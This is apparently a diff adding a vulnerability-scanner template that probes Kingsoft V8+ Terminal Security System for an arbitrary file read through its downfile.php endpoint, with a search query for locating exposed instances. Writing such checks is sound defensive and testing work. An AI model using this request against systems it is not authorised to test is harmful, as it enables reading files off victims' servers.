@@ -1,0 +1,14 @@
+name: Kingsoft V8+ Terminal Security System Fileread
+manual: true
+query: app="kingsoft-V8+-Terminal-security-system"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /htmltopdf/downfile.php?filename=downfile.php
+    expression: response.status == 200 && response.body.bcontains(b"$filename")
+expression: r0()
+detail:
+  description: Kingsoft V8+ Terminal Security System
+  tags: fileread
